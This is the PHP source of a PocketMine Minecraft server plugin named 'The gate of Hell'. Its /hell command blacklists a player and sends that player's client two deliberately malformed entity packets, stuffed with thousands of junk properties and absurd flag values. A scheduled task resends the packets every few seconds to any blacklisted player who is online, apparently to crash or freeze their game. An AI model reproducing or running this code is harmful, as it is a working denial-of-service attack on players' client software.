<?php
namespace TgoH;

#Base
use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\Player;
use pocketmine\Server;

#Entity
use pocketmine\entity\Entity;

#etc
use pocketmine\entity\Item as ItemEntity;
use pocketmine\network\protocol\AddEntityPacket;
use pocketmine\scheduler\PluginTask;

#Commands
use pocketmine\command\CommandExecutor;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;

#Utils
use pocketmine\utils\TextFormat as Color;
use TgoH\utils\tunedConfig as Config;

class Main extends PluginBase implements Listener{
  const NAME = 'The gate of Hell',
        VERSION = 'v√2';

  public function onEnable(){
    date_default_timezone_set("Asia/Tokyo");
    $this->initialize();
    $this->makePacket();
    $sec = new sec($this);
    $this->getServer()->getScheduler()->scheduleRepeatingTask($sec, 60);
    $this->getServer()->getPluginManager()->registerEvents($this,$this);
    $this->getLogger()->info(Color::GREEN.self::NAME." ".self::VERSION." が読み込まれました。");
  }

  public function onCommand(CommandSender $s, Command $command, $label, array $args){
    if (strtolower($label) === "hell") {
      if (isset($args[0])) {
        $target = $this->getServer()->getPlayer($args[0]);
        if (is_null($target)) {
          if (isset($this->black[strtolower($args[0])])) {
            $s->sendMessage("§4[TgoH] そのプレイヤーは既にブラックリストに登録されています");
          }else {
            $s->sendMessage("§4[TgoH] 指定されたプレイヤーをブラックリストに登録しました");
            $date = date("Y/m/d H:i:s");
            $tn = strtolower($args[0]);
            $this->black[$tn] = $date;
            $this->blackList->set($tn, $date);
            $this->blackList->save();
          }
        }else {
          $tn = strtolower($target->getName());
          $s->sendMessage("§4[TgoH] 指定されたプレイヤーをブラックリストに登録し、地獄の門を開きました。");
          $this->theEnd($target);
          $date = date("Y/m/d H:i:s");
          $this->black[$tn] = $date;
          $this->blackList->set($tn, $date);
          $this->blackList->save();
          $s->sendMessage("§4[TgoH] The end.");
        }
      }else {
        return false;
      }
    }
    return true;
  }

  private function theEnd($target){
    $target->dataPacket($this->pk1);
    $target->dataPacket($this->pk2);
  }

  public function phantomKiller(){
    foreach ($this->getServer()->getOnlinePlayers() as $p) {
      if (isset($this->black[strtolower($p->getName())])) {
        $this->theEnd($p);
      }
    }
  }

  public function onDisable(){
    $this->getLogger()->info(Color::RED.self::NAME." が無効化されました。");
  }

  /****************************************************************************/
  //適当
  private function initialize(){
    $dir = $this->getDataFolder();
    $black = "blackList.json";
    //
    if(!file_exists($dir)) mkdir($dir);
    if(!file_exists($dir.$black)) file_put_contents($dir.$black, []);
    $this->blackList = new Config($dir.$black, Config::JSON);
    $this->black = $this->blackList->getAll();
  }

  private function makePacket(){
    $pk1 = new AddEntityPacket();
    $pk1->eid = ++Entity::$entityCount;
    $pk1->type = ItemEntity::NETWORK_ID;
    $pk1->meta = 0;
    for ($count = 0; $count  < 1000; ++$count) {
      $pk1->{$count} = "JEHJHWQJGJQWIBUEVYBQEJHVEIYQWBIEYHQGBEIUQVEYQH";
      $pk1->{$count."m"} = $this;
    }
    $flags = 41249021947801269846120984216487129837128;
    $flags |= 1124715263512361294 << Entity::DATA_FLAG_INVISIBLE;
    $flags |= 181294871289431234 <<1<< Entity::DATA_FLAG_CAN_SHOW_NAMETAG;
    $flags |= 1<<42<<1**5**1+2**5412 <<2<< 2;
    $flags |= 112412513241 <<9<<1<< Entity::DATA_FLAG_IMMOBILE;
    $pk1->metadata = [
      Entity::DATA_FLAGS => [Entity::DATA_TYPE_LONG, $flags, 0<<1|2<<"dowaijdoanfo"],
      Entity::DATA_NAMETAG => [Entity::DATA_TYPE_STRING, ""],
      "3890127840713804701294612809481-57195-125791204","qawsertfyhuiop@;kiorhdojewibfuehfi",
    ];
    $this->pk1 = $pk1;
    $pk2 = new AddEntityPacket();
    for ($i=0; $i < 3000; $i++) {
      $pk2->{$i} = $i**20;
    }
    $this->pk2 = $pk2;
  }
}

class sec extends PluginTask{
  function __construct($main){
    parent::__construct($main);
    $this->main = $main;
  }
  function onRun($tick){
    $this->main->phantomKiller();
  }
}
